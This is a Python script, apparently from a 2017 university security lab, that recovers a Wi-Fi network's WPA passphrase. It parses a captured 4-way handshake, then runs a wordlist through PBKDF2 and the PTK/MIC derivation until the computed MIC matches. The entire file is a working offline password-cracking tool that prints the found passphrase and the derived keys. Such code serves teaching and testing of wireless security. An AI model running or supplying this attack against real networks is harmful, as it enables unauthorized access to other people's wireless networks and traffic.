#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Found the passphrase of an AP using WPA 4-way handshake packets
"""

__author__ = "Robin Müller et Stéphane Teixeira Carvalho"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__status__ = "Prototype"

from wpa_key_derivation import *

def main():
    # Read capture file -- it contains beacon, authentication, association, handshake and data
    wpa = rdpcap("wpa_handshake.cap")

    A = "Pairwise key expansion"  # This string is used in the pseudo-random function
    # Important parameters for key derivation - most of them can be obtained from the pcap file
    ssid, APmac, Clientmac = getAssociationRequestInfo(wpa)
    ANonce, SNonce, mic_to_test, data = getHandshakeInfo(wpa)

    B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce,
                                                                                  SNonce)  # Used in pseudo-random function
    # Show the values obtained from the pcap file
    print("\n\nValues used to derivate keys")
    print("============================")
    print("SSID: ", ssid, "\n")
    print("AP Mac: ", b2a_hex(APmac), "\n")
    print("CLient Mac: ", b2a_hex(Clientmac), "\n")
    print("AP Nonce: ", b2a_hex(ANonce), "\n")
    print("Client Nonce: ", b2a_hex(SNonce), "\n")


    print("\nTrying to find passphrase")
    print("============================")
    # Read from the wordlist
    f = open('./wordlist.txt', 'r')
    # Read each line of the file. The line read will be the passphrase to test
    for passPhrase in f.read().splitlines():
        # Encode the passphrase and the ssid as bytes
        passPhrase = str.encode(passPhrase)
        ssid_encoded = str.encode(ssid)
        # Calculate 4096 rounds to obtain the 256 bit (32 oct) PMK with the passphrase to test and the ssid
        pmk = pbkdf2(hashlib.sha1, passPhrase, ssid_encoded, 4096, 32)

        # Expand pmk to obtain PTK
        ptk = customPRF512(pmk, str.encode(A), B)

        # Calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
        mic = hmac.new(ptk[0:16], data, hashlib.sha1)

        # Remove the last 4 bytes of the mic calculated because SHA-1 return a 20 bytes output
        # and mic is only 16 bytes long
        if mic.digest()[:-4] == mic_to_test:
            print("Found valid passphrase:\t\t\t", passPhrase)
            print("\nResults of the key expansion")
            print("=============================")
            print("Passphrase:\t\t", passPhrase, "\n")
            print("PMK:\t\t", pmk.hex(), "\n")
            print("PTK:\t\t", ptk.hex(), "\n")
            print("KCK:\t\t", ptk[0:16].hex(), "\n")
            print("KEK:\t\t", ptk[16:32].hex(), "\n")
            print("TK: \t\t", ptk[32:48].hex(), "\n")
            print("MICK:\t\t", ptk[48:64].hex(), "\n")
            print("MIC:\t\t", mic.hexdigest(), "\n")
            break
        print("No result with passphrase:\t\t", passPhrase, "\n")

if __name__ == "__main__":
    main()
